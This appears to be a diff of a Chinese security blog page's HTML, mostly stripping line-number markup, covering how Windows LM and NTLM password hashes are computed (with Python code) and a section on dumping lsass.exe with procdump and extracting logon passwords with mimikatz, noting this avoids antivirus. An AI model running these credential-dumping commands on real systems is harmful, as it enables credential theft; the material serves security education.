@@ -63,7 +63,7 @@
         "description": "首发先知社区：https://xz.aliyun.com/t/8127 Windows 本地登陆密码储存在位于 %SystemRoot%\\system32\\config\\ 目录的 SAM 文件中，存储内容为密码的 hash 值。当用户输入密码时， Windows 先将用……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1679 ,
+        "wordCount":  1575 ,
         "image": ["https://oss.zjun.info/zjun.info/lmhash-ntlmhash-1.webp","https://oss.zjun.info/zjun.info/lmhash-ntlmhash-2.webp","https://oss.zjun.info/zjun.info/lmhash-ntlmhash-3.webp","https://oss.zjun.info/zjun.info/lmhash-ntlmhash-4.png","https://oss.zjun.info/zjun.info/lmhash-ntlmhash-5.webp","https://oss.zjun.info/zjun.info/lmhash-ntlmhash-6.webp"],
         "publisher": {
             "@type": "Organization",
@@ -291,75 +291,7 @@
 <li>将两组<code>DES</code>加密后的编码拼接，得到<code>LM HASH</code>值。</li>
 </ul>
 <p><code>Python3</code> 实现 <code>LM hash</code> 算法：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">binascii</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">codecs</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pyDes</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
@@ -423,9 +355,7 @@
 </span></span><span class="line"><span class="cl">    <span class="c1"># 将二组 DES 加密后的编码拼接，得到 LM HASH 值。</span>
 </span></span><span class="line"><span class="cl">    <span class="n">LM</span> <span class="o">=</span> <span class="n">LMOne</span> <span class="o">+</span> <span class="n">LMTwo</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;LM hash:&#39;</span><span class="p">,</span> <span class="n">LM</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>代码参考：<a href="https://xz.aliyun.com/t/2445" target="_blank" rel="noopener">https://xz.aliyun.com/t/2445</a></p>
+</span></span></code></pre></div><p>代码参考：<a href="https://xz.aliyun.com/t/2445" target="_blank" rel="noopener">https://xz.aliyun.com/t/2445</a></p>
 <p>当密码为 <code>123ABC</code> 或 <code>123456</code> 时如下：</p>
 <p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-2.webp" alt="lmhash-ntlmhash-2"></p>
 <p><code>LM Hash</code> 的缺陷在于：</p>
@@ -444,45 +374,7 @@
 <li>再调用<code>MD4</code>加密算法</li>
 </ul>
 <p><code>Python2</code> 实现 <code>NTLM hash</code> 算法：</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># coding=utf-8</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">codecs</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
@@ -516,23 +408,12 @@
 </span></span><span class="line"><span class="cl">    <span class="c1"># 转 md4</span>
 </span></span><span class="line"><span class="cl">    <span class="n">NTLMhash</span> <span class="o">=</span> <span class="n">Md4Encode</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;NTLMhash: &#39;</span> <span class="o">+</span> <span class="n">NTLMhash</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>后来在篇文章上发现了更简单的代码表现：</p>
+</span></span></code></pre></div><p>后来在篇文章上发现了更简单的代码表现：</p>
 <p>见 <a href="https://www.anquanke.com/post/id/193149#h3-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193149#h3-3</a></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span><span class="nn">binascii</span><span class="o">,</span><span class="nn">sys</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span><span class="nn">binascii</span><span class="o">,</span><span class="nn">sys</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;md4&#34;</span><span class="p">,</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-16le&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p>例如 <code>admin</code> 经 <code>NTLM hash</code> 后存储的值便是 <code>209c6174da490caeb422f3fa5a7ae634</code> 。</p>
+</span></span></code></pre></div><p>例如 <code>admin</code> 经 <code>NTLM hash</code> 后存储的值便是 <code>209c6174da490caeb422f3fa5a7ae634</code> 。</p>
 <p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-3.webp" alt="lmhash-ntlmhash-3"></p>
 <p><code>NTLM Hash</code> 在算法上比 <code>LM Hash</code> 安全性更高一些。</p>
 <h2 id="0x03-本地认证流程"><a href="#0x03-本地认证流程" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:0x03-本地认证流程" class="headings">0x03 本地认证流程</a></h2>
@@ -547,34 +428,13 @@ C --&gt; |No| E(认证失败);
 </div>
 <h2 id="0x04-procdumpmimikatz-读取密码-hash"><a href="#0x04-procdumpmimikatz-读取密码-hash" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:0x04-procdumpmimikatz-读取密码-hash" class="headings">0x04 Procdump+Mimikatz 读取密码 Hash</a></h2>
 <p>介绍完 <code>windows</code> 本地认证机制，可以发现在 <code>lsass.exe</code> 进程中是会存在有明文密码的，于是可以直接使用 <code>mimikatz</code> 读取，但是这样通常会被拦截</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe log <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="nb">exit</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-4.png" alt="lmhash-ntlmhash-4"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe log <span class="s2">&#34;privilege::debug&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="nb">exit</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-4.png" alt="lmhash-ntlmhash-4"></p>
 <p>所以可以利用工具 <code>procdump</code> 将 <code>lsass.exe</code>  <code>dump</code> 出来，拉到没有杀软的机器里面使用 <code>mimikatz</code> 读取密码。</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">procdump64.exe -accepteula -ma lsass.exe lsass.dump
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-5.webp" alt="lmhash-ntlmhash-5"></p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="nb">exit</span>
-</span></span></code></pre></td></tr></table></div>
-</div>
-</div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-6.webp" alt="lmhash-ntlmhash-6"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">procdump64.exe -accepteula -ma lsass.exe lsass.dump
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-5.webp" alt="lmhash-ntlmhash-5"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mimikatz.exe <span class="s2">&#34;sekurlsa::minidump lsass.dmp&#34;</span> <span class="s2">&#34;sekurlsa::logonPasswords full&#34;</span> <span class="nb">exit</span>
+</span></span></code></pre></div><p><img src="https://oss.zjun.info/zjun.info/lmhash-ntlmhash-6.webp" alt="lmhash-ntlmhash-6"></p>
 
             </div>
 
